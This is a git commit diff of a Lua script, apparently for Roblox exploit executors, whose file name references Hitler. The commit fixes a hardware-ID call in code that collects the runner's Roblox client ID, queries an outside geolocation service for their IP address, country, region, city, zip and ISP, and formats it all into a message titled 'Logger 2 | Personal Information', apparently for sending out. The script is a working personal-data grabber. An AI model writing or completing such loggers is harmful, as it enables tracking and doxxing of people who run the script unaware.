f25566f881c1ad9d152b0b781d96ce587f5089da
Endeictic <99983295+Endeictic@users.noreply.github.com>
2023-02-26 21:12:47 +0700

    Update
    Updated:
    HWID Fix

--- Adolf-AustrianPainter.lua
+++ Adolf-AustrianPainter.lua
@@ -1,12 +1,9 @@
-local fuRifKXqOL0ltne = "yo mama"
-
 if syn then
    HttpRequest = syn.request
    else
    HttpRequest = http_request
 end
-
-local HWID = game:GetService("RbxAnalyticsService"):GetClientId
+local hardware_id = game:GetService("RbxAnalyticsService"):GetClientId()
 
 local ip_info = HttpRequest({
     Url = "http://ip-api.com/json",
@@ -15,7 +12,7 @@ local ip_info = HttpRequest({
 local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
 local embed = {
         ['title'] = "Logger 2 | Personal Information",
-        ['description'] = string.format("\HWID (Hardware Identification): **%s**\nIP: **%s**\nCountry: **%s**\nCountry Code: **%s**\nRegion: **%s**\nRegion Name: **%s**\nCity: **%s**\nZip: **%s**\nISP: **%s**\nOrg: **%s**", HWID, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org),
+        ['description'] = string.format("\HWID: **%s**\nIP: **%s**\nCountry: **%s**\nCountry Code: **%s**\nRegion: **%s**\nRegion Name: **%s**\nCity: **%s**\nZip: **%s**\nISP: **%s**\nOrg: **%s**", hardware_id, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org),
         ["type"] = "rich",
         ["color"] = tonumber(getgenv().EmbedColor),
 }
